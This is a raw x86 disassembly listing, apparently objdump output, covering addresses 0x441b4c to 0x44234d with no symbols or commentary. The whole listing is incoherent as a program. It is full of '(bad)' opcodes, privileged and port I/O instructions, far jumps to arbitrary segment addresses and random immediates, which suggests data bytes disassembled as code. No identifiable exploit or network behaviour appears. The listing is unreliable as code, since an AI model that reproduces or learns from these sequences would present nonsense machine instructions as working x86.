  441b4c:	ja     0x441afb
  441b4e:	(bad)  
  441b50:	jmp    0xbc20:0x369cb974
  441b57:	mov    ah,0x5e
  441b59:	push   eax
  441b5a:	std    
  441b5b:	sub    al,BYTE PTR [edi+0x28]
  441b5e:	mov    al,0x84
  441b60:	(bad)  
  441b61:	gs push edx
  441b63:	aad    0xd7
  441b65:	mov    esp,0xa3fba731
  441b6a:	mov    bh,0xc8
  441b6c:	clc    
  441b6d:	cmp    eax,0xb94963c2
  441b72:	push   edx
  441b73:	pop    esp
  441b74:	dec    esi
  441b75:	mov    edx,0xd683c1ca
  441b7a:	cli    
  441b7b:	in     al,dx
  441b7c:	xchg   edi,eax
  441b7d:	dec    ebx
  441b7e:	icebp  
  441b7f:	aam    0x4d
  441b81:	es sub ch,ah
  441b84:	sub    ch,BYTE PTR [edx+0x46]
  441b87:	inc    esp
  441b88:	jbe    0x441baa
  441b8a:	mov    edi,0x53d32d04
  441b8f:	popf   
  441b90:	jne    0x441b1b
  441b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441b93:	out    dx,eax
  441b94:	fiadd  WORD PTR [bp+si+0x56]
  441b98:	adc    eax,0x7807572a
  441b9d:	call   0x1930:0x564c4b1d
  441ba4:	data16 add al,0x21
  441ba7:	(bad)
  441bab:	loope  0x441be2
  441bad:	jge    0x441bce
  441baf:	aam    0xf2
  441bb1:	fistp  WORD PTR [esi-0x4d]
  441bb4:	mov    ah,0xe1
  441bb6:	xchg   edi,eax
  441bb7:	jne    0x441b58
  441bb9:	stos   BYTE PTR es:[edi],al
  441bba:	push   edi
  441bbb:	jmp    0xac1fb9de
  441bc0:	lods   eax,DWORD PTR ds:[esi]
  441bc1:	in     al,dx
  441bc2:	jae    0x441c34
  441bc4:	mov    al,ds:0xfd427dcc
  441bc9:	push   ss
  441bca:	mov    dl,0xa4
  441bcc:	loope  0x441b7a
  441bce:	dec    ebp
  441bcf:	mov    ebx,0xedc70f25
  441bd4:	rol    ah,0xde
  441bd7:	sub    eax,0x9500f938
  441bdc:	jecxz  0x441bdf
  441bde:	push   cs
  441bdf:	mov    ebp,0xfd5ecd43
  441be4:	pop    edi
  441be5:	or     ah,al
  441be7:	inc    esi
  441be8:	addr16 mov ah,0xd
  441beb:	mov    eax,0xe8dbd9d5
  441bf0:	pop    ebx
  441bf1:	dec    DWORD PTR [ebx-0xf]
  441bf4:	sar    DWORD PTR [ecx+0x399124b0],0x23
  441bfb:	push   es
  441bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441bfd:	cmp    al,0x77
  441bff:	lock mov esp,0x9af893f2
  441c05:	hlt    
  441c06:	out    0xab,eax
  441c08:	int    0xa
  441c0a:	mov    ch,0xb4
  441c0c:	mov    WORD PTR ds:0x25a7cb8a,gs
  441c12:	push   esp
  441c13:	scas   eax,DWORD PTR es:[edi]
  441c14:	(bad)
  441c17:	icebp  
  441c18:	inc    eax
  441c19:	(bad)  
  441c1b:	push   ebp
  441c1c:	scas   al,BYTE PTR es:[edi]
  441c1d:	push   es
  441c1e:	div    BYTE PTR [esp+ebx*1+0x66d3d2e1]
  441c25:	es das 
  441c27:	pop    edx
  441c28:	or     eax,0x21edc1fa
  441c2d:	in     eax,0xb0
  441c2f:	out    dx,eax
  441c30:	push   esi
  441c31:	rol    BYTE PTR ds:0xc8fb6a0b,cl
  441c37:	adc    al,0xfd
  441c39:	mov    al,ds:0x9990e4ac
  441c3e:	mov    ebx,0x445e0006
  441c43:	mov    dl,0x2b
  441c45:	jp     0x441cbb
  441c47:	icebp  
  441c48:	jbe    0x441cb1
  441c4a:	sub    edx,DWORD PTR [ebp-0x81a99d0]
  441c50:	adc    eax,0x117d1a27
  441c55:	xchg   ah,bl
  441c57:	fst    QWORD PTR [ecx-0x7c084a37]
  441c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441c5e:	es mov ebx,0xe3c5bf0d
  441c64:	jno    0x441ccc
  441c66:	mov    ah,0x64
  441c68:	(bad)  
  441c69:	sbb    ch,BYTE PTR [edx+ebp*2]
  441c6c:	add    eax,0x67e4fc2e
  441c71:	dec    ecx
  441c72:	bound  edx,QWORD PTR [ecx+eiz*1-0x67]
  441c76:	neg    BYTE PTR [esi]
  441c78:	hlt    
  441c79:	mov    ds:0xf08cdb19,eax
  441c7e:	jnp    0x441c37
  441c80:	aaa    
  441c81:	mov    dl,0x42
  441c83:	mov    DWORD PTR [ebp+0x1bee26c4],ecx
  441c89:	jmp    0x964a3ce4
  441c8e:	jle    0x441d03
  441c90:	push   0x75cbdb99
  441c95:	int3   
  441c96:	dec    esi
  441c97:	sbb    dl,BYTE PTR [edi-0x29df1893]
  441c9d:	and    al,0xbe
  441c9f:	les    eax,FWORD PTR [eax-0x3a9fdd94]
  441ca5:	cmp    al,0x3b
  441ca7:	out    0xbb,al
  441ca9:	dec    esi
  441caa:	pushf  
  441cab:	or     ah,BYTE PTR [eax]
  441cad:	imul   edx,edi,0xf83537b6
  441cb3:	ret    0x9aa0
  441cb6:	imul   eax,esi,0xffffff9e
  441cb9:	fs cmp al,0x23
  441cbc:	ja     0x441c8e
  441cbe:	mov    dl,0x4f
  441cc0:	pop    es
  441cc1:	sahf   
  441cc2:	mov    bh,0x84
  441cc4:	push   ebp
  441cc5:	clc    
  441cc6:	sub    BYTE PTR [ebx+0x5],al
  441cc9:	xor    BYTE PTR [ebx+0x38a563f3],0xf6
  441cd0:	(bad)  
  441cd1:	mov    edx,0x1214a54
  441cd6:	cwde   
  441cd7:	cmc    
  441cd8:	fcmovnb st,st(7)
  441cda:	mov    WORD PTR [edx],es
  441cdc:	js     0x441cf5
  441cde:	lods   eax,DWORD PTR ds:[esi]
  441cdf:	into   
  441ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441ce1:	test   al,0xe5
  441ce3:	call   0x8c59dc83
  441ce8:	cmp    BYTE PTR [ebp-0x2b35b4c],bh
  441cee:	ret    
  441cef:	or     al,0xa5
  441cf1:	add    eax,0x608503b2
  441cf6:	jmp    0x83d141ee
  441cfb:	mov    esp,0xdf4ea917
  441d00:	sar    DWORD PTR [ebp+0x33],cl
  441d03:	(bad)  
  441d04:	xchg   edx,eax
  441d05:	sahf   
  441d06:	imul   esp,esp,0x4e
  441d09:	inc    edx
  441d0a:	xchg   ebx,eax
  441d0b:	lahf   
  441d0c:	iret   
  441d0d:	das    
  441d0e:	pop    edx
  441d0f:	retf   0xb1b3
  441d12:	mov    ds:0x505cc208,eax
  441d17:	icebp  
  441d18:	ins    DWORD PTR es:[edi],dx
  441d19:	mov    ch,0x48
  441d1b:	das    
  441d1c:	jmp    0xc61896bb
  441d21:	jmp    0xc1f1:0xf60aef50
  441d28:	in     eax,0x87
  441d2a:	lock dec ebp
  441d2c:	xor    bh,BYTE PTR [ecx]
  441d2e:	mov    bh,0x34
  441d30:	hlt    
  441d31:	clc    
  441d32:	sbb    DWORD PTR [edi],esp
  441d34:	lds    eax,FWORD PTR [eax-0x29030e3a]
  441d3a:	dec    ecx
  441d3b:	xchg   BYTE PTR [edx],bl
  441d3d:	stc    
  441d3e:	nop
  441d3f:	js     0x441cd3
  441d41:	es mov cl,0x62
  441d44:	hlt    
  441d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441d46:	mov    edi,DWORD PTR [eax]
  441d48:	sbb    ebx,DWORD PTR [esi]
  441d4a:	in     eax,0xb7
  441d4c:	ret    0xaa33
  441d4f:	test   eax,0x24e0533a
  441d54:	mov    ?,WORD PTR [edi-0x37e7190d]
  441d5a:	xchg   ecx,eax
  441d5b:	and    ah,BYTE PTR [ebp+0x4be68183]
  441d61:	mov    bh,0xf3
  441d63:	mov    WORD PTR [edx],ds
  441d65:	cmp    DWORD PTR [edi+0x46],esi
  441d68:	ins    DWORD PTR es:[edi],dx
  441d69:	test   BYTE PTR [eax+0x48],dl
  441d6c:	aas    
  441d6d:	xchg   edx,eax
  441d6e:	inc    eax
  441d6f:	rol    eax,0xa4
  441d72:	stos   DWORD PTR es:[edi],eax
  441d73:	scas   eax,DWORD PTR es:[edi]
  441d74:	cmp    BYTE PTR [ebx-0x46],0xa0
  441d78:	cdq    
  441d79:	call   0x3d53:0x44a9e7ab
  441d80:	pop    ecx
  441d81:	mov    edi,0x11e0d140
  441d86:	mov    ecx,0xa7b6b9c4
  441d8b:	arpl   WORD PTR ds:0x26aa1b9a,bx
  441d91:	pop    eax
  441d92:	sbb    esp,DWORD PTR [esi+ecx*1-0x45]
  441d96:	push   edx
  441d97:	fstp   QWORD PTR [eax]
  441d99:	fnstenv [esi-0x7c]
  441d9c:	push   ss
  441d9d:	xchg   esi,eax
  441d9e:	xchg   esi,eax
  441d9f:	rcr    DWORD PTR [eax+0x7e18cc8f],cl
  441da5:	inc    ebx
  441da6:	xchg   esi,eax
  441da7:	xor    BYTE PTR ds:0xb4f4a0e9,cl
  441dad:	jle    0x441d4a
  441daf:	iret   
  441db0:	inc    eax
  441db1:	in     al,0xbe
  441db3:	xchg   esp,eax
  441db4:	jae    0x441dc4
  441db6:	es fadd st,st(5)
  441db9:	jmp    0x18a6:0x87d0ed2f
  441dc0:	xchg   BYTE PTR [ecx+0xc2e6815],bl
  441dc6:	jmp    0x441dab
  441dc8:	fcmovnb st,st(2)
  441dca:	mov    bh,0x2d
  441dcc:	mov    ch,0xcb
  441dce:	sub    ebp,0x40365b82
  441dd4:	sub    eax,0x721dcb69
  441dd9:	mov    esp,0x27df1b1f
  441dde:	inc    ebx
  441ddf:	xchg   BYTE PTR ds:0x3fe4cbc6,dl
  441de5:	loope  0x441d92
  441de7:	mov    ebx,0x9da18af6
  441dec:	xchg   ebp,eax
  441ded:	and    eax,0x3925167f
  441df2:	repz push es
  441df4:	sub    BYTE PTR [esi],al
  441df6:	dec    edx
  441df7:	add    BYTE PTR [ebp-0x3d682460],ch
  441dfd:	xchg   esi,eax
  441dfe:	mov    DWORD PTR [edx],edx
  441e00:	mov    ch,0xe5
  441e02:	mov    ?,WORD PTR [ecx+0x2]
  441e05:	cwde   
  441e06:	mov    dh,0x84
  441e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441e09:	jno    0x441e27
  441e0b:	(bad)  
  441e0c:	enter  0x786a,0xf2
  441e10:	lods   eax,DWORD PTR ds:[esi]
  441e11:	dec    ebp
  441e12:	mov    dh,0xac
  441e14:	shr    BYTE PTR [edi-0x50],cl
  441e17:	aam    0xf6
  441e19:	(bad)  
  441e1a:	sbb    BYTE PTR [edi-0xa],0xc7
  441e1e:	dec    esp
  441e1f:	loop   0x441e6d
  441e21:	mov    ebp,0x619726f1
  441e26:	inc    esp
  441e27:	inc    edi
  441e28:	adc    edx,ebx
  441e2a:	pop    es
  441e2b:	xchg   BYTE PTR [bx+di+0x4cf],ah
  441e30:	std    
  441e31:	cmc    
  441e32:	inc    ebx
  441e33:	call   0x9e37:0x7a68c969
  441e3a:	fwait
  441e3b:	push   ds
  441e3c:	mov    ss,WORD PTR ds:0xc91b8bff
  441e42:	xor    al,0xd3
  441e44:	sbb    dh,ch
  441e46:	jbe    0x441e7f
  441e48:	(bad)  
  441e49:	mov    al,ds:0x15999e2b
  441e4e:	scas   al,BYTE PTR es:[edi]
  441e4f:	scas   al,BYTE PTR es:[edi]
  441e50:	and    BYTE PTR [edi+0x7f856bfa],0xbe
  441e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441e58:	and    dh,BYTE PTR [ecx-0x17]
  441e5b:	pop    ds
  441e5c:	and    eax,0x25f16cc7
  441e61:	fild   QWORD PTR [ecx+edx*1+0x3fb6932]
  441e68:	xchg   bl,ch
  441e6a:	lahf   
  441e6b:	mov    edi,0x56c23f19
  441e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441e71:	pushf  
  441e72:	in     al,dx
  441e73:	icebp  
  441e74:	aaa    
  441e75:	lods   al,BYTE PTR ds:[esi]
  441e76:	xchg   ebx,eax
  441e77:	hlt    
  441e78:	sahf   
  441e79:	inc    edi
  441e7a:	stos   DWORD PTR es:[edi],eax
  441e7b:	test   ch,0xb7
  441e7e:	mov    bh,0x14
  441e80:	fs sti 
  441e82:	jp     0x441eb2
  441e84:	mov    bh,0x20
  441e86:	cld    
  441e87:	push   esp
  441e88:	jne    0x441e2d
  441e8a:	add    al,0xec
  441e8c:	cdq    
  441e8d:	mov    es,eax
  441e8f:	retf   
  441e90:	std    
  441e91:	fidiv  DWORD PTR [ecx-0x74c6babc]
  441e97:	rol    BYTE PTR [ebp-0x29],0xc5
  441e9b:	in     al,dx
  441e9c:	jmp    0xa267:0xc26fc62c
  441ea3:	mov    bh,BYTE PTR [esp+ebx*1+0x496804bd]
  441eaa:	xchg   ebx,eax
  441eab:	call   0xf4632955
  441eb0:	xor    ah,dh
  441eb2:	fist   DWORD PTR [edi]
  441eb4:	sub    al,0xa7
  441eb6:	loop   0x441ead
  441eb8:	xchg   ebx,eax
  441eb9:	test   eax,0x10b52fd
  441ebe:	shr    DWORD PTR [esi],cl
  441ec0:	sub    eax,0xf5a6bb03
  441ec5:	adc    edi,0xffffffea
  441ec8:	cmp    ch,BYTE PTR [eax]
  441eca:	sub    eax,0x3e00a050
  441ecf:	cmp    DWORD PTR [eax],ebx
  441ed1:	xor    eax,0x9b2ac4b6
  441ed6:	fiadd  DWORD PTR [ecx+ebx*8+0x10c351ac]
  441edd:	enter  0x5cb3,0x35
  441ee1:	jge    0x441f20
  441ee3:	mov    eax,ds:0x6c66e920
  441ee8:	push   0x6f
  441eea:	in     al,dx
  441eeb:	ror    al,cl
  441eed:	xchg   BYTE PTR ds:0x2ba0617a,cl
  441ef3:	mov    edx,0x1e1456f
  441ef8:	mov    bh,0xd0
  441efa:	adc    ch,bl
  441efc:	loop   0x441e80
  441efe:	mov    dh,0xe4
  441f00:	and    edx,DWORD PTR [eax+0x47d56448]
  441f06:	nop
  441f07:	call   0x51f442a
  441f0c:	sbb    ebx,DWORD PTR [ecx]
  441f0e:	arpl   WORD PTR [edi+eiz*2-0x6f7cb79f],ax
  441f15:	call   0xe15a:0xd60b075b
  441f1c:	mov    BYTE PTR [eax+0x2d],cl
  441f1f:	rol    ah,1
  441f21:	mov    cl,0x7c
  441f23:	xchg   ebp,eax
  441f24:	xor    BYTE PTR [edi+0x65f320db],0x6d
  441f2b:	and    DWORD PTR [eax-0x60],eax
  441f2e:	aaa    
  441f2f:	pop    ebx
  441f30:	and    eax,0xd7083b9
  441f35:	inc    ebp
  441f36:	popf   
  441f37:	dec    ebp
  441f38:	and    DWORD PTR [ebp-0x13132d45],ebp
  441f3e:	aaa    
  441f3f:	push   ds
  441f40:	cwde   
  441f41:	test   eax,0x2f0702da
  441f46:	jmp    0x441f2f
  441f48:	sbb    DWORD PTR [esi+edi*4],edi
  441f4b:	test   BYTE PTR [edi-0x564d1ddc],ah
  441f51:	sar    BYTE PTR [ecx-0x73],0x96
  441f55:	add    ecx,ecx
  441f57:	add    al,0x20
  441f59:	mov    ch,0xb3
  441f5b:	jne    0x441fa0
  441f5d:	sahf   
  441f5e:	lahf   
  441f5f:	xchg   ecx,eax
  441f60:	mov    ds:0x5d684b05,eax
  441f65:	fistp  QWORD PTR [ebx+0x7831dcdd]
  441f6b:	and    eax,DWORD PTR [ecx-0x5f]
  441f6e:	repnz out dx,eax
  441f70:	cs leave 
  441f72:	(bad)  
  441f73:	push   esp
  441f74:	xor    dh,BYTE PTR [edi+0x7823dd1f]
  441f7a:	pop    esp
  441f7b:	adc    al,0x6a
  441f7d:	stc    
  441f7e:	xchg   ecx,eax
  441f7f:	lods   eax,DWORD PTR ds:[esi]
  441f80:	sbb    dl,cl
  441f82:	retf   
  441f83:	test   BYTE PTR [ecx-0x25],ah
  441f86:	mov    eax,0xeb391d02
  441f8b:	sbb    DWORD PTR ds:0xd809a741,edx
  441f91:	xchg   BYTE PTR [ebp-0x24],bl
  441f94:	adc    eax,0x879f57a2
  441f99:	retf   
  441f9a:	lds    edi,FWORD PTR [esi+0x1d]
  441f9d:	mov    ecx,0x11a16dce
  441fa2:	xchg   edi,eax
  441fa3:	or     DWORD PTR ds:0xcfb47c13,edi
  441fa9:	stc    
  441faa:	out    dx,al
  441fab:	out    0xde,al
  441fad:	les    esi,FWORD PTR [eax+0x73791af3]
  441fb3:	inc    ebp
  441fb4:	dec    ecx
  441fb5:	mov    dl,0xea
  441fb7:	popa   
  441fb8:	fbld   TBYTE PTR [ecx]
  441fba:	call   ebp
  441fbc:	adc    al,0xc5
  441fbe:	sti    
  441fbf:	(bad)  [edi+0x186cd61a]
  441fc5:	iret   
  441fc6:	pop    edx
  441fc7:	add    ebx,DWORD PTR [eax]
  441fc9:	dec    ecx
  441fca:	pop    ds
  441fcb:	imul   edi,DWORD PTR [eax+0x5b250a90],0x15668c81
  441fd5:	jbe    0x441f77
  441fd7:	mov    esi,0x852b9ebc
  441fdc:	popa   
  441fdd:	pop    esi
  441fde:	lock bound esp,QWORD PTR [ebx-0x3d]
  441fe2:	and    al,0xe5
  441fe4:	sti    
  441fe5:	popf   
  441fe6:	fwait
  441fe7:	dec    eax
  441fe8:	inc    edi
  441fe9:	fadd   st,st(0)
  441feb:	std    
  441fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441fed:	or     DWORD PTR [edx],eax
  441fef:	repz hlt 
  441ff1:	pop    edx
  441ff2:	adc    DWORD PTR [esi-0x6c],eax
  441ff5:	stos   BYTE PTR es:[edi],al
  441ff6:	test   eax,0x22191d67
  441ffb:	fsubrp st(6),st
  441ffd:	cmp    BYTE PTR [edi+0x582515c0],bl
  442003:	icebp  
  442004:	pop    esi
  442005:	cwde   
  442006:	popf   
  442007:	jno    0x442028
  442009:	jns    0x44200a
  44200b:	scas   al,BYTE PTR es:[edi]
  44200c:	xor    eax,0x11d6940a
  442011:	and    eax,0xca19fbda
  442016:	enter  0xc28a,0x37
  44201a:	retf   0x112c
  44201d:	pop    edi
  44201e:	mov    eax,0xa2498a3b
  442023:	repnz inc ebx
  442025:	hlt    
  442026:	and    eax,0xa259e558
  44202b:	jmp    0x1924:0xaddf2a98
  442032:	adc    DWORD PTR [ecx+0x2a52ab2e],edi
  442038:	and    ch,BYTE PTR [ecx]
  44203a:	xchg   ebp,eax
  44203b:	iret   
  44203c:	or     DWORD PTR [edi],ebp
  44203e:	mov    dl,0x59
  442040:	sbb    BYTE PTR [edx-0x2490a3d5],0xb7
  442047:	push   edx
  442048:	lahf   
  442049:	cmc    
  44204a:	jmp    0x78954671
  44204f:	xchg   edi,eax
  442050:	cmp    al,0xc5
  442052:	mov    esp,0xa5209524
  442057:	mov    ebp,0xf3146ad5
  44205c:	mov    ebx,0x1e032ae6
  442061:	jmp    0x30f4c466
  442066:	jle    0x4420a2
  442068:	mov    esi,0x1d407b9c
  44206d:	ret    0xc136
  442070:	data16 adc al,0x6e
  442073:	dec    edi
  442074:	outs   dx,BYTE PTR ds:[esi]
  442075:	inc    eax
  442076:	mov    bl,0x4
  442078:	loopne 0x44202f
  44207a:	nop
  44207b:	xchg   ch,dh
  44207d:	xchg   ebx,eax
  44207e:	sbb    eax,0x8e2d4ae8
  442083:	dec    eax
  442084:	sbb    eax,0x86220f29
  442089:	and    DWORD PTR [edi+0x3ba1b129],0xba3b721c
  442093:	pop    ebp
  442094:	jmp    0x44205a
  442096:	cmp    DWORD PTR [ecx],ecx
  442098:	(bad)  
  442099:	cmp    eax,0x956d34bd
  44209e:	pushf  
  44209f:	mov    bl,0x65
  4420a1:	std    
  4420a2:	push   edi
  4420a3:	jmp    0xe686a066
  4420a8:	push   ds
  4420a9:	sbb    ebp,ebp
  4420ab:	ins    BYTE PTR es:[edi],dx
  4420ac:	mov    edi,0x8eba04c1
  4420b1:	pushf  
  4420b2:	sbb    eax,DWORD PTR [edi-0x37]
  4420b5:	xchg   bl,ch
  4420b7:	mov    al,es:0xcdd2c9c9
  4420bd:	std    
  4420be:	push   ebp
  4420bf:	enter  0x5aef,0x9b
  4420c3:	sbb    eax,0xacbfdd3c
  4420c8:	dec    ebp
  4420c9:	or     eax,0xb3e11c2c
  4420ce:	sub    esi,0x39
  4420d1:	mov    ah,0xa
  4420d3:	icebp  
  4420d4:	and    DWORD PTR [ecx],ebx
  4420d6:	jo     0x442111
  4420d8:	out    dx,al
  4420d9:	jo     0x442128
  4420db:	push   ebp
  4420dc:	retf   
  4420dd:	mov    eax,ds:0x7bf9232b
  4420e2:	fld    QWORD PTR [edi+0x4cdc8c76]
  4420e8:	jno    0x442086
  4420ea:	scas   al,BYTE PTR es:[edi]
  4420eb:	xchg   esi,eax
  4420ec:	fisttp WORD PTR [ebx-0x4b]
  4420ef:	ror    BYTE PTR [ebx+eax*4-0x23],1
  4420f3:	out    dx,eax
  4420f4:	pop    DWORD PTR [ebx-0x6412b1fd]
  4420fa:	mov    bh,0x54
  4420fc:	repnz inc ebp
  4420fe:	xchg   bh,ch
  442100:	pushf  
  442101:	gs push esp
  442103:	push   ebp
  442104:	and    al,0x19
  442106:	popf   
  442107:	jne    0x4420ae
  442109:	rol    DWORD PTR [edi+0x9],cl
  44210c:	out    0xd4,eax
  44210e:	or     al,0x97
  442110:	and    BYTE PTR [eax-0x6d],ch
  442113:	adc    BYTE PTR [edx+0x37262409],dl
  442119:	add    BYTE PTR [edx-0x4f005ace],ch
  44211f:	lahf   
  442120:	inc    ebp
  442121:	aas    
  442122:	dec    ebx
  442123:	icebp  
  442124:	imul   edx,esp,0xf221d722
  44212a:	repnz cwde 
  44212c:	and    eax,0x264b133
  442131:	sbb    BYTE PTR [edi-0x538169d4],ah
  442137:	shl    DWORD PTR [ecx],cl
  442139:	lds    eax,FWORD PTR [edi-0x17]
  44213c:	jmp    0xbc3ecb2c
  442141:	sar    BYTE PTR [eax+0x6271c904],1
  442147:	sub    al,0x15
  442149:	ins    BYTE PTR es:[edi],dx
  44214a:	shr    dl,0x5a
  44214d:	shr    DWORD PTR [ecx+0xa],1
  442150:	dec    edx
  442151:	push   0x73
  442153:	outs   dx,DWORD PTR ds:[esi]
  442154:	sbb    eax,0x516c2409
  442159:	test   eax,0x64f5e672
  44215e:	leave  
  44215f:	out    0xa7,eax
  442161:	aad    0x24
  442163:	inc    eax
  442164:	(bad)  
  442165:	cmp    eax,0x92d59857
  44216a:	add    eax,0x620b1dee
  44216f:	xchg   edx,eax
  442170:	(bad)  
  442171:	jo     0x44213e
  442173:	pop    edi
  442174:	in     eax,0x9e
  442176:	sub    DWORD PTR [ebx+ebx*4+0x7c],0x98b62f06
  44217e:	mov    esi,0xa5e47f74
  442183:	add    ah,ah
  442185:	daa    
  442186:	or     dh,BYTE PTR [ecx]
  442188:	adc    eax,0x67e9908a
  44218d:	outs   dx,BYTE PTR ds:[esi]
  44218e:	mov    dh,0xa6
  442190:	push   es
  442191:	adc    DWORD PTR [ecx+0x6e886dc7],esi
  442197:	mov    ch,0xdd
  442199:	cmp    BYTE PTR [edx+esi*8],cl
  44219c:	fxch   st(4)
  44219e:	sub    esp,edi
  4421a0:	jecxz  0x442125
  4421a2:	pop    ebp
  4421a3:	mov    ds:0xf439819b,al
  4421a8:	push   ds
  4421a9:	jns    0x442196
  4421ab:	or     BYTE PTR [ecx*1-0x3f3e36d8],dl
  4421b2:	pushf  
  4421b3:	out    dx,al
  4421b4:	pop    eax
  4421b5:	mov    eax,ds:0x72e22dbb
  4421ba:	adc    eax,0x3deb14c8
  4421bf:	pop    es
  4421c0:	dec    ebp
  4421c1:	cmp    DWORD PTR [esi-0x755544fc],edx
  4421c7:	inc    ebx
  4421c8:	and    eax,0xa5157be7
  4421cd:	push   ebx
  4421ce:	fsubr  st(7),st
  4421d0:	stos   DWORD PTR es:[edi],eax
  4421d1:	or     al,BYTE PTR [esi]
  4421d3:	hlt    
  4421d4:	and    eax,0x5893b039
  4421d9:	inc    BYTE PTR [ebp+edi*1+0x3]
  4421dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4421de:	stos   DWORD PTR es:[edi],eax
  4421df:	dec    eax
  4421e0:	cmp    eax,0xd2d01b63
  4421e5:	ins    DWORD PTR es:[edi],dx
  4421e6:	pop    es
  4421e7:	mov    bl,0x24
  4421e9:	fwait
  4421ea:	mov    esi,0x7cc2d2d4
  4421ef:	xchg   esi,eax
  4421f0:	out    0x7d,eax
  4421f2:	(bad)  
  4421f4:	loop   0x4421b6
  4421f6:	(bad)  
  4421f7:	pop    esp
  4421f8:	hlt    
  4421f9:	inc    ebp
  4421fa:	fnsetpm(287 only) 
  4421fc:	push   ds
  4421fd:	dec    ecx
  4421fe:	jmp    0xc9b889e3
  442203:	and    DWORD PTR [ecx-0x66],ebp
  442206:	imul   ecx,DWORD PTR [edx],0xffffffc6
  442209:	xchg   ecx,eax
  44220a:	lods   eax,DWORD PTR ds:[esi]
  44220b:	stc    
  44220c:	xor    al,0xc0
  44220e:	push   esp
  44220f:	stos   BYTE PTR es:[edi],al
  442210:	cli    
  442211:	adc    bh,BYTE PTR [ebx+0x52460f84]
  442217:	and    ebp,ebp
  442219:	and    al,0xef
  44221b:	(bad)
  44221f:	pop    esp
  442220:	cmp    al,0xd
  442222:	mov    dh,0x24
  442224:	cmp    eax,0xebe5089f
  442229:	jecxz  0x4421c5
  44222b:	lds    ecx,FWORD PTR [eax]
  44222d:	push   esi
  44222e:	das    
  44222f:	es call 0xc674d460
  442235:	and    al,0x37
  442237:	stos   BYTE PTR es:[edi],al
  442238:	jge    0x4422a4
  44223a:	les    esi,FWORD PTR [ecx]
  44223c:	mov    bh,0xe
  44223e:	mov    bh,0x24
  442240:	mov    ah,0x9a
  442242:	jl     0x44226f
  442244:	in     al,0xa7
  442246:	mov    esp,DWORD PTR [esi+0x1a]
  442249:	add    eax,0x7f8ad584
  44224e:	in     al,0x8f
  442250:	xor    DWORD PTR ds:0xaa0254d8,0xffffffc7
  442257:	fcmovnu st,st(7)
  442259:	ss leave 
  44225b:	mov    eax,ds:0xf9913ad5
  442260:	out    0xa8,al
  442262:	pusha  
  442263:	imul   esi,edx,0xb6705790
  442269:	fistp  QWORD PTR [edx-0x6973f5ac]
  44226f:	or     BYTE PTR [edx+0x23],bl
  442272:	dec    ebx
  442273:	(bad)  
  442274:	arpl   WORD PTR gs:[edx+ebp*8],dx
  442278:	pop    edx
  442279:	out    0x53,al
  44227b:	xor    ch,al
  44227d:	dec    esi
  44227e:	ss out 0x2a,al
  442281:	popf   
  442282:	jb     0x4422db
  442284:	adc    esi,DWORD PTR [ecx+0x3c]
  442287:	leave  
  442288:	int    0xba
  44228a:	mov    esi,0xdf46cc44
  44228f:	stc    
  442290:	in     eax,0x9c
  442292:	sti    
  442293:	pop    es
  442294:	xchg   esi,eax
  442295:	pop    edx
  442296:	jb     0x44225d
  442298:	jp     0x4422a3
  44229a:	call   0x3d9c:0x6fd00f0
  4422a1:	pop    ebp
  4422a2:	mov    bl,0xeb
  4422a4:	xor    edx,DWORD PTR [ebp+0x16e52c1a]
  4422aa:	jns    0x44229f
  4422ac:	xchg   eax,edi
  4422ae:	sub    al,0xf6
  4422b0:	push   ss
  4422b1:	pop    ecx
  4422b2:	mov    cl,0xae
  4422b4:	mov    dh,0xdb
  4422b6:	sub    BYTE PTR [ecx],ch
  4422b8:	sahf   
  4422b9:	iret   
  4422ba:	jmp    0x442332
  4422bc:	pop    eax
  4422bd:	clc    
  4422be:	dec    eax
  4422bf:	jno    0x44225d
  4422c1:	push   ebp
  4422c2:	jae    0x4422f2
  4422c4:	push   ss
  4422c5:	dec    ecx
  4422c6:	gs hlt 
  4422c8:	xchg   DWORD PTR [edi+0x71],esp
  4422cb:	aam    0x7e
  4422cd:	mov    bx,0xb65d
  4422d1:	jle    0x44226e
  4422d3:	popa   
  4422d4:	push   eax
  4422d5:	test   al,0xef
  4422d7:	scas   eax,DWORD PTR es:[edi]
  4422d8:	arpl   WORD PTR [edx],ax
  4422da:	int    0x2a
  4422dc:	sbb    ecx,esi
  4422de:	jae    0x4422c6
  4422e0:	jecxz  0x4422b7
  4422e2:	mov    ecx,0xcd8babd0
  4422e7:	popf   
  4422e8:	inc    edx
  4422e9:	sahf   
  4422ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4422eb:	(bad)  
  4422ec:	hlt    
  4422ed:	out    dx,al
  4422ee:	adc    al,0xf8
  4422f0:	and    BYTE PTR [ecx],ch
  4422f2:	or     eax,0x66b5bdcf
  4422f7:	out    0x8,al
  4422f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4422fa:	jmp    0x4422a0
  4422fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4422fd:	ja     0x4422cb
  4422ff:	aaa    
  442300:	inc    edi
  442301:	test   BYTE PTR ds:0xb6fdc208,0x54
  442308:	inc    edx
  442309:	sub    BYTE PTR [edi-0x77ea9e0],cl
  44230f:	adc    eax,0x8dad35c7
  442314:	sub    DWORD PTR [ebx+0x67],eax
  442317:	xchg   ebx,eax
  442318:	xor    al,0x90
  44231a:	mov    ebp,0xd68976f3
  44231f:	je     0x442332
  442321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442322:	mov    eax,ds:0xaba0a503
  442327:	and    al,0xe3
  442329:	test   BYTE PTR [ebp+0x7],ch
  44232c:	test   DWORD PTR ds:0x891e8706,0x66278377
  442336:	retf   
  442337:	fld    st(6)
  442339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44233a:	or     ebx,DWORD PTR [edx-0x1c13344e]
  442340:	imul   ebp,ebp,0xb45e7767
  442346:	mov    ebx,0x906cdda4
  44234b:	xchg   dh,dh
  44234d:	and    BYTE PTR [ecx+0x15],bh
